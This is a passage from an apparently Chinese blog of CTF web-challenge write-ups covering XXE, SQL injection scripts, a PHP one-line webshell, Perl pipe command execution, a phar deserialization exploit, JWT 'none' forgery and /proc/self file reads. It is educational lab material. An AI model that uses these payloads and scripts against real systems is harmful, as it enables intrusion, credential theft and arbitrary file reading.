tmp.encode('idna').decode('utf-8')\n        if res==\"c\":\n            print(tmp)\n    except:\n        continue\n```\n\n结果：\n\n```\nℂ\nℭ\nⅭ\nⅽ\nⒸ\nⓒ\nＣ\nｃ\n```\n\n随便拎一个构造payload，题中提示了使用了nginx，尝试访问默认nginx配置文件\n\n```\n配置文件存放目录：/etc/nginx\n主要配置文件：/etc/nginx/conf/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\nNginx配置文件：/usr/local/nginx/conf/nginx.conf\n```\n\n```\nfile://suctf.cℂ/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\n查看flag即可\n\n```\nfile://suctf.cℂ/usr/fffffflag\n```\n\n## [NCTF2019]True XML cookbook\n\n又一个XXE，先尝试一下直接读flag吧\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///flag\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\nemmmmmm文件似乎不存在，再尝试读取网站源码，返回0没有内容，再试试PHP伪协议\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n```php\n<?php\n/**\n* autor: c0ny1\n* date: 2018-2-7\n*/\n\n$USERNAME = 'admin'; //账号\n$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码\n$result = null;\n\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\n\ntry{\n\t$dom = new DOMDocument();\n\t$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\t$creds = simplexml_import_dom($dom);\n\n\t$username = $creds->username;\n\t$password = $creds->password;\n\n\tif($username == $USERNAME && $password == $PASSWORD){\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",1,$username);\n\t}else{\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",0,$username);\n\t}\t\n}catch(Exception $e){\n\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",3,$e->getMessage());\n}\n\nheader('Content-Type: text/html; charset=utf-8');\necho $result;\n?>\n```\n\n这玩楞也妹啥用啊\n\n看看wp，拓展XXE漏洞，可以利用任意文件读取的特性来探测内网存活主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp：**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///etc/hosts\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-05 19.29.23.png)\n\n找到内网中IP，尝试在ip末尾爆破，出flag\n\n~~也不知道我这个环境有啥问题就是跑不出来，以后再试试~~\n\n## [CISCN2019 总决赛 Day2 Web1]Easyweb\n\nrobots.txt\n\n```\nDisallow: *.php.bak\n```\n\n拿到image.php源码\n\n```php\n<?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\n查看源码，发现传入的id和path都将变量经过addslashes转换后的`\\0,%00,\\','`替换为空\n\n那么我们如果传入\\\\\\0，前两个反斜杠由于转义，结果是\\0，经过addslashes变为\\\\\\0，再经过str_replace变为\\，此时整个sql语句变为\n\n```mysql\nselect * from images where id='\\' or path='{$path}'\n```\n\n我们就可以在path处进行sql注入\n\n```\ntables:images,users\n```\n\n```python\nimport requests\nurl=r\"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\\\0&path=or id=\"\nname='admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'\nfor i in range(1,100):\n    for j in name:\n        payload=f\"if((ascii(substr((select group_concat(password)from users),{i},1))={ord(j)}),1,0)--+\"\n        tex=requests.get(url+payload).text\n        if \"JFIF\" in tex:\n            print(j,end='')\n            break\n```\n\n在users表中获得用户名和密码`admin:157aeccdaba2cf3324cf`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.43.40.png)\n\n尝试上传一句话木马，显示不允许上传php文件，上传任意文件尝试，得到提示\n\n```\nI logged the file name you uploaded to logs/upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.\n```\n\n将文件名写入log.php文件，在文件名处尝试构造木马，还是提示不能上传，看来在文件名处对php进行了过滤，尝试短标签绕过成功\n\n```\n<?= eval($_POST['kkk']);?>\n```\n\n拿flag\n\n## [RCTF2015]EasySQL\n\n进入页面发现有一个登录一个注册，怀疑是二次注入，尝试在用户名中加入单双引号测试，注册成功但是登录失败，看看wp，使用反斜杠进行测试，在修改密码处测试成功，报错回显\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.58.42.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [HITCON 2017]SSRFme\n\n```PHP\n<?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\n两眼一蒙，直接[wp](https://blog.csdn.net/qq_49422880/article/details/121430262)，是新知识耶\n\n> 题目的意思是先以MD5(orange .ip)生成一个hash,放在sandbox之下，然后使用GET命令进行访问，那里就可以使用perl 进行命令执行，执行的前提是 前面必须要创建一个和这个命令一样的文件。然后呢就是将命令执行的结果放到我们传进去的文件里面。\n\n先看看根目录下有什么\n\n```\n?url=/&filename=aaa\n```\n\n看到了readflag文件，应该是要在根目录执行这个文件拿到flag了\n\n> 主要的知识点：perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠|）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。\n\n看payload\n\n```\npayload1:\n/?url=file:bash -c /readflag|&filename=bash -c /readflag|\n这一步是先将bash -c /readflag|写入名为bash -c /readflag|的文件里\npayload2:\n/?url=file:bash -c /readflag|&filename=aaa\n这一步是要执行上一步中写入的命令并把结果放入aaa文件中\npayload3:\n/sandbox/230317844a87b41e353b096d0d6a5145/aaa\n```\n\n## [CISCN2019 华北赛区 Day1 Web1]Dropbox\n\n注册->登录->上传文件->尝试下载->发现任意文件读取漏洞，查看源码\n\n```php\n//index.php\n<?php\ninclude \"class.php\";\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);//将一个func放入funcs\n        foreach ($this->files as $file) {//files为一个数组，存放new出的对象并进行遍历\n            $this->results[$file->name()][$func] = $file->$func();\n          \t//results是一个二维数组，[文件名][方法]=方法执行结果\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n\n```\n\n应该是反序列化了，提示了phar协议，正好学习一下\n\n#### phar简介\n\nphar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。可以将phar文件类比为一个压缩文件\n\n```\nphar文件结构\n\n1. a stub\n可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。\n\n2. a manifest describing the contents\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n\n3. the file contents\n被压缩文件的内容。\n\n4. [optional] a signature for verifying Phar integrity (phar file format only)\n签名，放在文件末尾\n```\n\n先找反序列化链子吧\n\n> 会发现在File类中有一个close()函数，这里还直接调用file_get_comtents()函数,那么不多说这里绝对是链子的结尾。但是如果只用这两个类是不够的，因为不能直接打印出来。所以得继续下一个类FileList继续使用，正好里面也有__call函数。func是调用的方法名，args是方法的参数\n>  \n> 那么我们就将$this->db复制为FileList类这样我们就可以直接使用该类中得方法。\n\n```PHP\n//exp.php\n<?php\n\nclass User{\n    public $db;\n    public function __construct() \n    {\n        $this->db = new FileList();\n    }\n}\n\nclass File{\n    public $filename;\n}\n\nclass FileList {\n    private $files;\n    public function __construct() \n    {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n    }\n\n}\n\n$User = new User();\n$phar = new Phar(\"./rabbit.phar\"); //.phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($User); //触发的头是User类，所以传入User对象\n$phar->addFromString(\"test.txt\", \"test\"); //生成签名\n$phar->stopBuffering();\n?>\n\n```\n\n在delete页面传入phar://文件名即可\n\n## [CISCN2019 华北赛区 Day1 Web5]CyberPunk\n\n看源码得到提示`<!--?file=?-->`伪协议读代码\n\n```php\n//confirm.php\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"已提交订单\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n//change.php\n<?php\nrequire_once \"config.php\";\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单修改成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n```\n\n关键在于confirm中没有对传入的address进行过滤，而在change中又对查询出的旧address进行了使用，所以我们在更改地址的时候就会触发我们在confirm中提交的payload\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select database()),0x7e),1)#\n1' where phone=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\n```\n\n查完库和表发现好像不是在数据库内，load_file看看文件\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select load_file('/flag.txt')),0x7e),1)#\n```\n\n拿到flag\n\n## [HFCTF2020]EasyLogin\n\n注册登录后点击`GET FLAG`显示权限不足，查看返回内容发现jwt\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 21.14.12.png)\n\n下一步不知道咋走了，看wp是要分析源码\n\n```javascript\n//app.js\nfunction login() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    const token = sessionStorage.getItem(\"token\");\n    $.post(\"/api/login\", {username, password, authorization:token})\n        .done(function(data) {\n            const {status} = data;\n            if(status) {\n                document.location = \"/home\";\n            }\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction register() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    $.post(\"/api/register\", {username, password})\n        .done(function(data) {\n            const { token } = data;\n            sessionStorage.setItem('token', token);\n            document.location = \"/login\";\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction logout() {\n    $.get('/api/logout').done(function(data) {\n        const {status} = data;\n        if(status) {\n            document.location = '/login';\n        }\n    });\n}\n\nfunction getflag() {\n    $.get('/api/flag').done(function(data) {\n        const {flag} = data;\n        $(\"#username\").val(flag);\n    }).fail(function(xhr, textStatus, errorThrown) {\n        alert(xhr.responseJSON.message);\n    });\n}\n\n```\n\n这里贴一张js代码结构图\n\n![](https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n看看controllers中的app.js\n\n```javascript\n//controllers/app.js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\n\n可以看到加密算法是HS256，尝试将其更改为None直接传入\n\n```python\nimport jwt\ntoken = jwt.encode(\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"aaaaa\",\n  \"iat\": 1649380156\n},\nalgorithm=\"none\",key=\"\").encode(encoding='utf-8')\n\nprint(token)\n```\n\n登录成功！\n\n访问/api/flag拿到flag\n\n## [b01lers2020]Welcome to Earth\n\n阴间题！！！！！！！！！！！\n\n进去就疯狂跳转，总之就是不断查看源码不要跳转到die，最终跳转到fight查看js\n\n```javascript\n// Run to scramble original flag\n//console.log(scramble(flag, action));\nfunction scramble(flag, key) {\n  for (var i = 0; i < key.length; i++) {\n    let n = key.charCodeAt(i) % flag.length;\n    let temp = flag[i];\n    flag[i] = flag[n];\n    flag[n] = temp;\n  }\n  return flag;\n}\n\nfunction check_action() {\n  var action = document.getElementById(\"action\").value;\n  var flag = [\"{hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!}\", \"_baa\", \"aaaa\", \"pctf\"];\n\n  // TODO: unscramble function\n}\n```\n\n按照人间语法拼出flag\n\n```\npctf{hey_boys_im_baaaaaaaaaack!}\n```\n\n## [WUSTCTF2020]CV Maker\n\n看到这种模版化的界面，尝试扫目录看看是不是代码审计，结果没有，乖乖注册登录，发现可以上传头像，空文件直接上传发现警告\n\n```\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76\n```\n\nemmmmmmm，使用exif_imagetype可使用幻数头绕过，上传木马\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 22.05.39.png)\n\n访问拿flag即可\n\n## [GYCTF2020]Ezsqli\n\n布尔注入喵喵，脚本懒得贴了喵喵\n\n```\ndatabase：give_grandpa_pa_pa_pa\n```\n\ninformation_schema被ban了，mysql.innodb_table_stats也被ban了，新新知识居然还有个能用的\n\n```mysql\nselect group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()\ntable:f1ag_1s_h3r3_hhhhh,users233333333333333\n1^((select ('~','~'))>(select * from f1ag_1s_h3r3_hhhhh))\n```\n\n最后就是无列名注入啦\n\n```python\nimport requests\nflagname=\"flag-{1234567890bcdefg}\"\nname=\",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890\"\nurl=\"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php\"\nflag=\"\"\nfor i in range(1,100):\n    for j in range(33,128):\n        tmp=flag+chr(j)\n        data={'id':f\"0^((select 1,'{tmp}')>(select * from f1ag_1s_h3r3_hhhhh))\"}\n        tes=requests.post(url=url,data=data).text\n        if \"Nu1L\" in tes:\n            print(chr(j-1),end=\"\")\n            flag=flag+chr(j-1)\n            break\n```\n\n## [网鼎杯 2018]Comment\n\n先爆破登录，zhangwei666\n\n.git文件泄露\n\nGitHack扫出后发现代码内容不全，使用Git恢复旧仓库\n\n```php\n//write_do.php\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n很明显在comment处存在二次注入，又因为此处insert是带有换行的，所以不能直接使用#来进行注释，使用/**/进行多行注释，构造payload\n\n```mysql\ncategory:0',content=database(),/*\n留言comment处:*/#\n最终构造出的语句\ninsert into comment\nset category = '0',content=database(),/*',\ncontent = '*/#',\nbo_id = '$bo_id'\";\n\ninsert into comment set category = '0',content=database(),bo_id = '$bo_id'\";\n```\n\n在回显留言即可看到结果\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 08.47.30.png)\n\n按照这个方法查完全库也没有结果，尝试loadfile吧，不知道读啥，捞一下wp的结果\n\n> load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。\n> 一般用法步骤：\n> 读/etc/init.d下的东西，这里有配置文件路径\n> ?id=1' union select 1,2,load_file('/etc/init.d/httpd')\n> 得到web安装路径\n> ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')\n> 读取密码文件\n> ?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')\n\n先看/etc/passwd\n\n```\nwww:x:500:500:www:/home/www:/bin/bash\n```\n\n得到跑web服务的用户\n\n> 每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。\n\n访问拿到用过的命令\n\n```\ncd /tmp/ \nunzip html.zip \nrm -f html.zip \ncp -r html /var/www/ \ncd /var/www/html/ \nrm -f .DS_Store \nservice apache2 start\n```\n\n访问/tmp/html/.DS_Store拿到文件夹内容，太长内容可能包含sql语句，使用16进制编码，发现文件`flag_8946e1ff1ee3e40f.php`，读取拿flag即可，记得读/var/www/html下的文件，tmp中的不正确\n\n## [watevrCTF-2019]Cookie Store\n\ncookiebase64解一下然后改了价格再传回去\n\n## [网鼎杯 2020 白虎组]PicDown\n\nPicDown，下载照片，尝试访问/etc/passwd下载成功，看来可以找找源码，没啥文件包含思路，看wp，是linux的进程文件\n\n> 可以通过/proc/pid/ 来 获 取 指 定 进 程 的 信 息 ， 例 如 内 存 映 射 、 CPU绑 定 信 息 等 等 。 如 果 某 个 进 程 想 要 获 取 本 进 程 的 系 统 信 息 ， 就 可 以 通 过 进 程 的pid来 访 问 /proc/ pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。\n\n其中的重要文件\n\n```\ncmdline\ncmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：\n\ncwd\ncwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录\n\nenviron\nenviron文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息\n\nfd\nfd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。\n```\n\n利用\n\n```\n1.获取当前启动进程的完成命令：\ncat /proc/self/cmdline\n\n2.获取目标当前进程的运行目录与目录里的文件：\nls -al /proc/self/cwd\nls /proc/self/cwd\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n4.获取当前环境变量\ncat /proc/self/environ\n\n5.获取当前进程打开的文件内容\ncat /proc/self/fd/{id}\n也可以是：\ncat /proc/*/fd/*    --*可以代替任意数字和字母\n```\n\n本题中我们可以访问一下这几个位置\n\n```\ncmdline\npython2 app.py\n\nenviron\nMAIL=/var/mail/app\nUSER=app\nHOME=/home/app\nLOGNAME=app\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nSHELL=/bin/sh\nPWD=/app\n```\n\n在运行位置拿到源码\n\n```python\n#/proc/self/cwd/app.py\nfrom flask import Flask, Response\nfrom flask import render_template\nfrom flask import request\nimport os\nimport urllib\n\napp = Flask(__name__)\n\nSECRET_FILE = \"/tmp/secret.txt\"\nf = open(SECRET_FILE)\nSECRET_KEY = f.read().strip()\nos.remove(SECRET_FILE)\n\n\n@app.route('/')\ndef 